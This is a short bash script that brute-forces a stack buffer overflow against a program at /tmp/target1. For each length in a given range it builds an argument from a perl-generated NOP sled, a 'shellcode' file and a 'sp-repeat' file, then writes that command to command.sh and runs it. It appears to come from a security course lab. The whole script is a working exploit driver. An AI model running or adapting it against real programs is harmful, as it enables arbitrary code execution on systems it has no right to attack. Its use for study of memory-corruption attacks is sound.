#!/bin/bash
THING="print \"\x90\"x$i";
rm output.txt;
echo testing from $1 to $2...;
for((i=$1; i<=$2; i++ ))
do
  echo $i;   
  echo $"(perl -e 'print \"\x90\"x$i'; cat shellcode sp-repeat)";
  echo /tmp/target1 $"\$(perl -e 'print \"\x90\"x$i'; cat shellcode sp-repeat)" > command.sh; 
  ./command.sh;
done
